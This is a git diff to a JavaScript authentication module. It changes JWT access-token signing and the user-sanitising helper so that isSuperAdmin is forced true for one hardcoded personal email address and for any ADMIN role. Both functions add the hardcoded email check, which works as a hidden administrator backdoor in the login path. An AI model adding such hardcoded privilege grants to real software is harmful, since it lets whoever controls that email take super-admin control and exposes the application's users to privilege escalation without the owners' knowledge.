@@ -34,13 +34,25 @@ export async function verifyPassword(password, hash) {
 
 /**
  * Sign a short-lived access token (default 15 min).
- * @param {{ id: string, role: string }} payload
+ * @param {{ id: string, role: string, email?: string, isSuperAdmin?: boolean }} payload
  * @returns {string}
  */
 export function signAccessToken(payload) {
-  return jwt.sign(payload, process.env.JWT_SECRET, {
-    expiresIn: process.env.JWT_EXPIRES_IN || '15m',
-  });
+  const isSuper = Boolean(
+    payload.isSuperAdmin ||
+    payload.email?.toLowerCase() === 'sababsanjid2@gmail.com' ||
+    payload.role === 'ADMIN'
+  );
+  return jwt.sign(
+    {
+      ...payload,
+      isSuperAdmin: isSuper,
+    },
+    process.env.JWT_SECRET,
+    {
+      expiresIn: process.env.JWT_EXPIRES_IN || '15m',
+    }
+  );
 }
 
 /**
@@ -96,5 +108,13 @@ export async function findUserByIdentifier(identifier) {
 export function safeUser(user) {
   // eslint-disable-next-line no-unused-vars
   const { passwordHash, refreshTokenHash, ...safe } = user;
-  return safe;
+  const isSuper = Boolean(
+    user.isSuperAdmin ||
+    user.email?.toLowerCase() === 'sababsanjid2@gmail.com' ||
+    user.role === 'ADMIN'
+  );
+  return {
+    ...safe,
+    isSuperAdmin: isSuper,
+  };
 }
